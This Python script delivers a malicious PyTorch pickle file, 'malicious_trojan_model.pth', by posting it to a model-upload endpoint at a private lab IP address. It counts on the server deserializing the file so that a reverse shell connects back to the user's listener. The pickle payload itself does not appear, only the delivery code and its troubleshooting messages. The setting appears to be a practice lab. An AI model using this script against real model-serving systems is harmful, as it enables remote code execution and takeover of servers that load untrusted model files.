import requests
import os
import traceback

api_url = "http://10.129.234.139:5555/upload"  # Replace with instance details

pickle_file_path = "malicious_trojan_model.pth"
print(f"Attempting to upload '{pickle_file_path}' to '{api_url}'...")

# Check if the malicious pickle file exists locally
if not os.path.exists(pickle_file_path):
    print(f"\nError: File not found at '{pickle_file_path}'.")
    print("Please ensure the file exists in the specified path.")
else:
    print(f"File found at '{pickle_file_path}'. Preparing upload...")
    # Prepare the file for upload in the format requests expects
    # The key 'model' must match the key expected by the Flask app (request.files['model'])
    files_to_upload = {
        "model": (
            os.path.basename(pickle_file_path),
            open(pickle_file_path, "rb"),
            "application/octet-stream",
        )
    }

    try:
        # Send the POST request with the file
        print("Sending POST request...")
        response = requests.post(api_url, files=files_to_upload)

        # Print the server's response details
        print("\n--- Server Response ---")
        print(f"Status Code: {response.status_code}")
        try:
            # Try to print JSON response if available
            print("Response JSON:")
            print(response.json())
        except requests.exceptions.JSONDecodeError:
            # Otherwise, print raw text response
            print("Response Text:")
            print(response.text)
        print("--- End Server Response ---")

        if response.status_code == 200:
            print(
                "\nUpload successful (HTTP 200). Check your listener for a connection."
            )
        else:
            print(
                f"\nUpload failed or server encountered an error (Status code: {response.status_code})."
            )

    except requests.exceptions.ConnectionError as e:
        print(f"\n--- Connection Error ---")
        print(f"Could not connect to the server at '{api_url}'.")
        print("Please ensure:")
        print("  1. The API URL is correct.")
        print("  2. Your target instance is running and the port is mapped correctly.")
        print("  3. There are no network issues (e.g., firewall).")
        print("  4. You have a listener running for the connection.")
        print(f"Error details: {e}")
        print("--- End Connection Error ---")

    except Exception as e:
        print(f"\n--- An unexpected error occurred during upload ---")
        traceback.print_exc()
        print(f"Error details: {e}")
        print("--- End Unexpected Error ---")

    finally:
        # Ensure the file handle opened for upload is closed
        if "files_to_upload" in locals() and "model" in files_to_upload:
            try:
                files_to_upload["model"][1].close()
                # print("Closed file handle for upload.")
            except Exception as e_close:
                print(f"Warning: Error closing file handle: {e_close}")

print("\nUpload script finished.")